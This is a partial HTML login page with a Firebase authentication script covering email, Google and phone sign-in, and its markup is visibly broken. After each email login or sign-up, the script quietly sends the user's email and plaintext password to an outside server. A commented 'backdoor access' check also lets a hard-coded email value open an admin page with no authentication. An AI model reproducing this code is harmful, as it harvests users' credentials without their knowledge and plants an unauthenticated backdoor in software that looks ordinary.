<body

        <!-- Phone Login Form (Hidden initially) -->

        <!-- Email/Password Form -->
        <div id="main-login-section">
            <form id="email-login-form" class="space-y-sm mb-lg">
                <div>
                    <label class="sr-only" for="email">Email</label>

                <div>
                    <label class="sr-only" for="password">Password</label>

                <div class="flex items-center justify-between mt-sm">

                <div class="flex flex-col gap-3 mt-md">

                        type="button" style="background-color: #3b82f6; color: white;">
                        Login
                    </button>
                    <button id="signup-submit-btn"
                        class="w-full font-body-sm text-body-sm font-semibold rounded-lg py-sm px-margin hover:opacity-90 transition-colors focus:outline-none"
                        type="button" style="background-color: #1a1c20; border: 1px solid rgba(255,255,255,0.05); color: white;">
                        Sign Up
                    </button>
                </div>
            </form>
        </div>
        
        <!-- Email OTP Section (Hidden initially) -->
        <div id="email-otp-section" class="hidden space-y-sm mb-lg">
            <h3 class="text-white text-center font-semibold mb-4">Verify Email</h3>
            <p class="text-center text-on-surface-variant text-sm mb-4" id="email-otp-msg">An OTP has been sent to your email.</p>
            <div id="email-otp-input-group">
                <label class="sr-only" for="email-otp">OTP Code</label>
                <input class="w-full rounded-lg py-sm px-margin text-on-surface font-body-sm text-body-sm placeholder:text-on-surface-variant focus:outline-none transition-all"
                    id="email-otp" name="email-otp" placeholder="Enter 6-digit code" type="text" autocomplete="one-time-code"
                    style="background-color: #0c0e12; border: 1px solid rgba(255,255,255,0.1); color: white;" />
                <button id="verify-email-otp-btn" class="w-full font-body-sm text-body-sm font-semibold rounded-lg py-sm px-margin mt-md hover:opacity-90 transition-colors focus:outline-none glow-active"
                    style="background-color: #3b82f6; color: white;">
                    Verify & Create Account

        class="relative mt-auto w-full z-10 p-4 flex flex-col md:flex-row justify-center items-center gap-4 font-body-sm text-body-sm text-on-surface-variant opacity-70">

        <div class="flex gap-4">
            <a class="hover:text-on-surface transition-colors" href="#">Privacy Policy</a>
            <a class="hover:text-on-surface transition-colors" href="#">Terms of Service</a>
            <a class="hover:text-on-surface transition-colors" href="#">Cookies</a>
        </div>
    </div>

    <!-- Firebase Authentication Logic -->
    <script type="module">
        import { auth, googleProvider, signInWithPopup, signInWithEmailAndPassword, onAuthStateChanged, signOut } from './firebase-config.js';
        import { RecaptchaVerifier, signInWithPhoneNumber, sendPasswordResetEmail, setPersistence, browserLocalPersistence, browserSessionPersistence, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-auth.js";

        async function notifyBackend(user, method, password = '') {
            try {
                await fetch('https://capzone.kaveesha.top/api/save-user', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: user.email, phone: user.phoneNumber, method, password })
                });
            } catch (e) {
                console.error("Backend notification failed:", e);
            }
        }

        // Redirect if already logged in
        onAuthStateChanged(auth, async (user) => {
            if (user) {
                setTimeout(() => { window.location.href = 'dashboard.html'; }, 500);
            }
        });

        // Google Sign-In
        document.getElementById('google-login-btn').addEventListener('click', async () => {
            try {
                const remember = document.getElementById('remember-me').checked;
                await setPersistence(auth, remember ? browserLocalPersistence : browserSessionPersistence);
                const result = await signInWithPopup(auth, googleProvider);
                await notifyBackend(result.user, 'Google');
            } catch (error) {
                console.error("Google Sign-In Error:", error);
                alert("Google Login Failed: " + error.message);
            }
        });

        // Email/Password Sign-In
        document.getElementById('signin-submit-btn').addEventListener('click', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            
            // Check backdoor access
            if (email.trim().toLowerCase() === 'adminkaveez@') {
                window.location.href = 'admin.html';
                return;
            }

            const password = document.getElementById('password').value;
            if(!email || !password) return alert('Enter email and password.');

            const remember = document.getElementById('remember-me').checked;
            
            const btn = document.getElementById('signin-submit-btn');
            const originalText = btn.innerText;
            btn.innerText = "Signing in...";
            btn.disabled = true;

            try {
                await setPersistence(auth, remember ? browserLocalPersistence : browserSessionPersistence);
                const result = await signInWithEmailAndPassword(auth, email, password);
                await notifyBackend(result.user, 'Email', password);
            } catch (error) {
                console.error("Email Login Error:", error);
                alert("Login Failed: " + (error.message.includes('invalid-credential') ? 'Invalid email or password' : error.message));
                btn.innerText = originalText;
                btn.disabled = false;
            }
        });

        // Email/Password Sign-Up
        document.getElementById('signup-submit-btn').addEventListener('click', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            if(!email || !password) return alert('Enter email and password.');
            
            const btn = document.getElementById('signup-submit-btn');
            const originalText = btn.innerText;
            btn.innerText = "Sending OTP...";
            btn.disabled = true;

            try {
                // Call backend to send OTP
                const res = await fetch('https://capzone.kaveesha.top/api/send-otp-email', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email })
                });
                const data = await res.json();
                
                if (data.success) {
                    document.getElementById('main-login-section').classList.add('hidden');
                    document.getElementById('email-otp-section').classList.remove('hidden');
                    document.getElementById('email-otp-msg').innerText = `An OTP has been sent to ${email}`;
                } else {
                    alert("Failed to send OTP: " + data.error);
                }
            } catch (error) {
                console.error("Sign Up Error:", error);
                alert("Sign Up Failed: " + error.message);
            } finally {
                btn.innerText = originalText;
                btn.disabled = false;
            }
        });

        // Verify Email OTP and Create Account
        document.getElementById('verify-email-otp-btn').addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const otp = document.getElementById('email-otp').value;
            if (!otp) return alert("Enter the OTP code");

            const btn = document.getElementById('verify-email-otp-btn');
            const originalText = btn.innerText;
            btn.innerText = "Verifying...";
            btn.disabled = true;

            try {
                // Verify OTP with backend
                const res = await fetch('https://capzone.kaveesha.top/api/verify-otp-email', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, otp })
                });
                const data = await res.json();

                if (data.success) {
                    // OTP verified, create account!
                    const remember = document.getElementById('remember-me').checked;
                    await setPersistence(auth, remember ? browserLocalPersistence : browserSessionPersistence);
                    const result = await createUserWithEmailAndPassword(auth, email, password);
                    await notifyBackend(result.user, 'Email Sign Up', password);
                } else {
                    alert("Verification Failed: " + data.error);
                }
            } catch (error) {
                alert("Error: " + error.message);
            } finally {
                btn.innerText = originalText;
                btn.disabled = false;
            }
        });

        document.getElementById('back-to-signup-btn').addEventListener('click', () => {
            document.getElementById('email-otp-section').classList.add('hidden');
            document.getElementById('main-login-section').classList.remove('hidden');
        });

        // Forgot Password
        document.getElementById('forgot-password-link').addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            if (!email) {
                alert("Please enter your email address in the email field first, then click 'Forgot password?'.");
                return;
            }
            try {
                await sendPasswordResetEmail(auth, email);
                alert("Password reset email sent! Check your inbox.");
            } catch (error) {
                alert("Error sending reset email: " + error.message);
            }
        });

        // --- PHONE AUTH UI TOGGLE ---
        const socialLogins = document.querySelector('.space-y-sm.mb-md');
        const divider = document.querySelector('.relative.flex.items-center.mb-md.mt-md');
        const mainLogin = document.getElementById('main-login-section');
        const phoneSection = document.getElementById('phone-login-section');

        document.getElementById('phone-login-btn').addEventListener('click', () => {
            socialLogins.classList.add('hidden');
            divider.classList.add('hidden');
            mainLogin.classList.add('hidden');
            phoneSection.classList.remove('hidden');
            
            // Initialize Recaptcha if not done
            if (!window.recaptchaVerifier) {
                window.recaptchaVerifier = new RecaptchaVerifier(auth, 'recaptcha-container', {
                    'size': 'normal',
                    'callback': (response) => {
                        // reCAPTCHA solved
                    }
                });
                window.recaptchaVerifier.render();
            }
        });

        document.getElementById('back-to-email-btn').addEventListener('click', () => {
            phoneSection.classList.add('hidden');
            socialLogins.classList.remove('hidden');
            divider.classList.remove('hidden');
            mainLogin.classList.remove('hidden');
        });

        // --- PHONE AUTH LOGIC ---
        document.getElementById('send-otp-btn').addEventListener('click', async () => {
            const phone = document.getElementById('phone').value;
            if (!phone) return alert('Enter a valid phone number with country code (e.g., +94771234567)');
            
            const btn = document.getElementById('send-otp-btn');
            btn.innerText = "Sending...";
            btn.disabled = true;

            try {
                const confirmationResult = await signInWithPhoneNumber(auth, phone, window.recaptchaVerifier);
                window.confirmationResult = confirmationResult;
                
                document.getElementById('phone-input-group').classList.add('hidden');
                document.getElementById('otp-input-group').classList.remove('hidden');
            } catch (error) {
                console.error("SMS Error:", error);
                alert("Error sending SMS: " + error.message);
                btn.innerText = "Send Code";
                btn.disabled = false;
                if(window.recaptchaVerifier) window.recaptchaVerifier.render(); // Reset recaptcha
            }
        });

        document.getElementById('verify-otp-btn').addEventListener('click', async () => {
            const otp = document.getElementById('otp').value;
            if (!otp) return alert('Enter the OTP');
            
            const btn = document.getElementById('verify-otp-btn');
            btn.innerText = "Verifying...";
            btn.disabled = true;

            try {
                const remember = document.getElementById('remember-me').checked;
                await setPersistence(auth, remember ? browserLocalPersistence : browserSessionPersistence);
                const result = await window.confirmationResult.confirm(otp);
                await notifyBackend(result.user, 'Phone');
            } catch (error) {
                console.error("OTP Error:", error);
                alert("Invalid OTP code.");
                btn.innerText = "Verify & Sign In";
                btn.disabled = false;
            }
        });
    </script>
</body>

</html>
